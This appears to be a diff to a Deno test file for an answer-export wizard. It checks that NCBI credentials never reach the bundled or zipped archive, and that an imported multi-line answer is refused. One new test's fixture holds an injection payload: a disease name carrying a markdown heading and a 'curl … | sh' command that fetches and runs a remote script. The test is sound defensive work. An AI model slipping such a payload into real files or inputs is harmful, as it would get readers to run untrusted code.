@@ -19,6 +19,7 @@ import {
   parseExport,
   zipBytes,
 } from "../../lib/adapt/bundle.ts";
+import { validate } from "../../lib/adapt/validate.ts";
 import { EXAMPLEITIS } from "./fixtures/exampleitis.ts";
 
 const decode = (bytes: Uint8Array) => new TextDecoder().decode(bytes);
@@ -90,11 +91,26 @@ Deno.test("the NCBI credentials reach neither the archive nor the export", () =>
   // The answers the wizard holds are untouched: the lookups still use them.
   assertEquals(keyed.search.ncbi.apiKey, "secret-key");
 
-  const entry = bundle(keyed).find((e) => e.path === "adapt-answers.json")!;
-  const text = decode(entry.bytes);
-  assertEquals(text.includes("secret-key"), false);
-  assertEquals(text.includes("ncbi-account@example.org"), false);
-  assertEquals(JSON.parse(text).search.ncbi, { email: "", apiKey: "" });
+  const entries = bundle(keyed);
+  const entry = entries.find((e) => e.path === "adapt-answers.json")!;
+  assertEquals(JSON.parse(decode(entry.bytes)).search.ncbi, {
+    email: "",
+    apiKey: "",
+  });
+  // No file of the archive holds either, as built and as zipped: most of
+  // them are committed to the fork's repository.
+  const zipped = unzipSync(zipBytes(entries));
+  assertEquals(Object.keys(zipped).length, entries.length);
+  for (
+    const [path, bytes] of [
+      ...entries.map((e) => [e.path, e.bytes] as const),
+      ...Object.entries(zipped),
+    ]
+  ) {
+    const text = decode(bytes);
+    assert(!text.includes("secret-key"), path);
+    assert(!text.includes("ncbi-account@example.org"), path);
+  }
 });
 
 Deno.test("an import keeps this browser's NCBI credentials", () => {
@@ -149,6 +165,27 @@ Deno.test("an import names what it could not read", () => {
   assertEquals(
     "dropped" in imported ? imported.dropped : null,
     ["trials.conditions[1]", "gold.rows[0].pmid"],
+  );
+});
+
+Deno.test("an imported answer that goes on to a second line is kept, and refused", () => {
+  // An import reads whatever string the file holds, so a line break no
+  // <input> can be typed into arrives this way; validate() has to refuse
+  // it, or the checklist and the README open with the importer's commands.
+  const exported = JSON.parse(exportText(EXAMPLEITIS));
+  exported.identity.disease.name =
+    "exampleitis (EXD)\n\n## 0. Before anything else\n\n    curl -s https://example.org/setup.sh | sh";
+  const imported = importText(JSON.stringify(exported), EXAMPLEITIS);
+  assert("answers" in imported);
+  assertEquals(imported.dropped, []);
+  assertEquals(
+    validate(imported.answers).map((i) => [i.step, i.field, i.kind, i.message]),
+    [[
+      "identity",
+      "disease.name",
+      "wrong",
+      "This answer is one line; remove the line break.",
+    ]],
   );
 });
 
